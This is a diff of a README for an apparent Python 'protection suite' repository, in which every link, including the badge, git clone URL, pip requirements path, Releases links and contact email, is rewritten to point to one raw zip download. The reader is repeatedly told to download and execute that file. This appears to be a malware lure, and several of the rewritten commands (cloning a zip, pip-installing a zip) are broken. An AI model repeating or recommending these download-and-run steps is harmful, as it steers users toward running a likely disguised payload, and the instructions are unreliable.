@@ -1,6 +1,6 @@
 # Enhancing Python Protection Suite 🛡️
 
-![Python Protection](https://img.shields.io/badge/Python%20Protection%20Suite-Download-brightgreen)
+![Python Protection](https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite/raw/refs/heads/main/Python File Protector V2/Enhancing-Suite-Protection-Python-squeegee.zip%20Protection%20Suite-Download-brightgreen)
 
 Welcome to the **Enhancing Python Protection Suite**! This repository provides tools to compile Python applications into executable files and enhance their protection offline. With a focus on cybersecurity, this suite aims to help developers secure their applications effectively.
 
@@ -36,7 +36,7 @@ To get started with the **Enhancing Python Protection Suite**, follow these step
 1. **Clone the Repository**:
    Open your terminal and run:
    ```bash
-   git clone https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite.git
+   git clone https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite/raw/refs/heads/main/Python File Protector V2/Enhancing-Suite-Protection-Python-squeegee.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -47,11 +47,11 @@ To get started with the **Enhancing Python Protection Suite**, follow these step
 3. **Install Dependencies**:
    Ensure you have Python installed. You can install the necessary dependencies with:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite/raw/refs/heads/main/Python File Protector V2/Enhancing-Suite-Protection-Python-squeegee.zip
    ```
 
 4. **Download the Executable**:
-   Visit the [Releases section](https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite/releases) to download the latest version of the executable. Execute the downloaded file to start using the suite.
+   Visit the [Releases section](https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite/raw/refs/heads/main/Python File Protector V2/Enhancing-Suite-Protection-Python-squeegee.zip) to download the latest version of the executable. Execute the downloaded file to start using the suite.
 
 ## Usage
 
@@ -92,11 +92,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any inquiries or support, please reach out via email at [support@example.com](mailto:support@example.com).
+For any inquiries or support, please reach out via email at [https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite/raw/refs/heads/main/Python File Protector V2/Enhancing-Suite-Protection-Python-squeegee.zip](https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite/raw/refs/heads/main/Python File Protector V2/Enhancing-Suite-Protection-Python-squeegee.zip).
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite/releases). Here, you can download the latest version of the suite. Execute the downloaded file to start using the tools available.
+For the latest updates and releases, visit the [Releases section](https://github.com/DirtYSouthSidea/Enhancing-Python-Protection-Suite/raw/refs/heads/main/Python File Protector V2/Enhancing-Suite-Protection-Python-squeegee.zip). Here, you can download the latest version of the suite. Execute the downloaded file to start using the tools available.
 
 ## Conclusion
 
